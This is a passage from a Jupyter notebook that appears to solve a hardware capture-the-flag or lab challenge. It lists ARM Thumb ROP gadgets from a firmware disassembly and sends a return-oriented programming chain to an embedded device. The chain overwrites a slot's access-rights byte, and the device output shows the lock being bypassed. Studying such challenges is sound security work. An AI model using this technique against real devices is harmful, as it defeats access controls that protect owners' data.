        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "kk7dXE4_cEU4",
        "outputId": "306dfe45-1cec-45e0-d583-b52fc8b9d159"
      },
      "execution_count": 66,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            " 8000166:\t2301      \tmovs\tr3, #1\n",
            " 8000168:\t7023      \tstrb\tr3, [r4, #0]\n",
            " 800016a:\tbd10      \tpop\t{r4, pc}\n",
            "\n",
            " 800037a:\t3301      \tadds\tr3, #1\n",
            " 800037c:\t7183      \tstrb\tr3, [r0, #6]\n",
            " 800037e:\tbd10      \tpop\t{r4, pc}\n",
            "\n",
            " 80042fe:\tf803 2f01 \tstrb.w\tr2, [r3, #1]!\n",
            " 8004302:\td1f9      \tbne.n\t80042f8 <memmove+0xdc>\n",
            " 8004304:\tbd70      \tpop\t{r4, r5, r6, pc}\n",
            "\n",
            " 8004dac:\t6022      \tstr\tr2, [r4, #0]\n",
            " 8004dae:\t701e      \tstrb\tr6, [r3, #0]\n",
            " 8004db0:\tbd70      \tpop\t{r4, r5, r6, pc}\n",
            "\n",
            " 8004dc6:\t6022      \tstr\tr2, [r4, #0]\n",
            " 8004dc8:\t701e      \tstrb\tr6, [r3, #0]\n",
            " 8004dca:\tbd70      \tpop\t{r4, r5, r6, pc}\n",
            "\n",
            " 8004e06:\t6022      \tstr\tr2, [r4, #0]\n",
            " 8004e08:\t701d      \tstrb\tr5, [r3, #0]\n",
            " 8004e0a:\tbd70      \tpop\t{r4, r5, r6, pc}\n",
            "\n",
            " 8004e22:\t6022      \tstr\tr2, [r4, #0]\n",
            " 8004e24:\t701d      \tstrb\tr5, [r3, #0]\n",
            " 8004e26:\tbd70      \tpop\t{r4, r5, r6, pc}\n",
            "\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "# so to summarize\n",
        "# 0x0800031b:\tpop\tr3,r4,r5,pc}\n",
        "# 0x08004e25 : strb r5, [r3]; pop r4,r5,r6,pc\n",
        "# 0x08000287 : main loop\n",
        "# address of slot 0: 0x2000000a\n",
        "# address of slot i: 0x2000000a + i*2\n",
        "# address of slot i access rights: 0x2000000a + i*2 + 1\n",
        "app = App()\n",
        "slot=7\n",
        "app.send('0000111122223333', # don't care\n",
        "         0x0800031b, # pc: jump to pop r3,r4,r5,pc\n",
        "         0x2000000a+slot*2+1, # r3 address to write to\n",
        "         'AAAA', # r4 don't care\n",
        "         0xf, # r5 byte to write (all access)\n",
        "         0x08004e25, # pc: jump to strb r5, [r3]; pop r4,r5,r6,pc\n",
        "         'AAAA', # r4 don't care\n",
        "         'AAAA', # r5 don't care\n",
        "         'AAAA', # r6 don't care\n",
        "         0x08000287 # main loop\n",
        "         )\n",
        "app.send('s')\n",
        "app.send('r7')"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "NblMwWD0Xu4b",
        "outputId": "f2d4760e-d143-4072-968d-f91c3a665c5d"
      },
      "execution_count": 74,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "ready...\n",
            "0000111122223333\u001b\u0003\n",
            "Rx: read value at slot x. ex R2\n",
            "Wxvvv: write value vvv at slot x. ex W137 writes 37 into slot 1\n",
            "Ix: increment value in slot x\n",
            "Uyyyyyyyy: unlock slots. yyyyy is the password. ex U1234\n",
            "S: get status on slots\n",
            "error\n",
            "ready...\n",
            "s\n",
            "device locked\n",
            "0  RW-L\n",
            "1  RW-L\n",
            "2  RW-L\n",
            "3  R--L\n",
            "4  R-IL\n",
            "5  RW--\n",
            "6  R---\n",
            "7  RWIL\n",
            "ok\n",
            "r7\n",
            "0\n",
            "ok\n"
          ]
        },
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "99"
            ]
          },
          "metadata": {},
          "execution_count": 74
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [],
      "metadata": {
        "id": "upbzUMgTiPcw"
      },
      "execution_count": null,
      "outputs": []
    }
  ]
}